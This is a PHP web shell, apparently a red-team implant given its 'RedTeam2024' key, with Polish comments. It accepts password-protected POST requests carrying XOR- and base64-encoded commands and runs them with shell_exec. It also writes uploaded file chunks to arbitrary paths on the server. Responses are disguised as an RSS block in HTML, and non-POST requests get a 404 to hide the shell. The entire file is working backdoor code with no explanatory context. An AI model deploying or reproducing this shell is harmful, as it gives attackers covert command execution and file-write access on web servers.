<?php

define('AUTH_KEY', '123456');
define('XOR_KEY', 'RedTeam2024');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(404);
    exit;
}

if (!isset($_POST['auth']) || $_POST['auth'] !== AUTH_KEY) {
    http_response_code(403);
    exit;
}

function xor_string($data, $key) {
    $output = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $output .= $data[$i] ^ $key[$i % strlen($key)];
    }
    return $output;
}

if (!isset($_POST['data'])) {
    http_response_code(400);
    exit;
}

$encrypted = base64_decode($_POST['data']);
$command = xor_string($encrypted, XOR_KEY);

// === OBSŁUGA UPLOADU ===
// Format: UPLOAD:/sciezka/docelowa:numer_chunku:base64_chunk
if (str_starts_with($command, "UPLOAD:")) {
    $parts = explode(":", $command, 4);
    if (count($parts) === 4) {
        $remotePath = $parts[1];
        $chunkId = intval($parts[2]);
        $chunkDataEncoded = $parts[3];

        // Odszyfruj zawartość chunka
        $chunkDecrypted = xor_string(base64_decode($chunkDataEncoded), XOR_KEY);

        // Zapisz do pliku (append)
        file_put_contents($remotePath, $chunkDecrypted, FILE_APPEND);
	//file_put_contents("log.txt", "remotePath=$remotePath\nchunkId=$chunkId\nchunkLen=" . strlen($chunkDecrypted) . "\n", FILE_APPEND);

        $response = "Chunk $chunkId OK";
        $encrypted_result = xor_string($response, XOR_KEY);
        $encoded_result = base64_encode($encrypted_result);

        header('Content-Type: text/html');
        echo '<html><body>';
        echo '<div id="rss"><![CDATA[' . $encoded_result . ']]></div>';
        echo '</body></html>';
        exit;
    }
}

// === WYKONYWANIE KOMEND ===
$result = shell_exec($command);

$encrypted_result = xor_string($result, XOR_KEY);
$encoded_result = base64_encode($encrypted_result);

header('Content-Type: text/html');
echo '<html><body>';
echo '<div id="rss"><![CDATA[' . $encoded_result . ']]></div>';
echo '</body></html>';
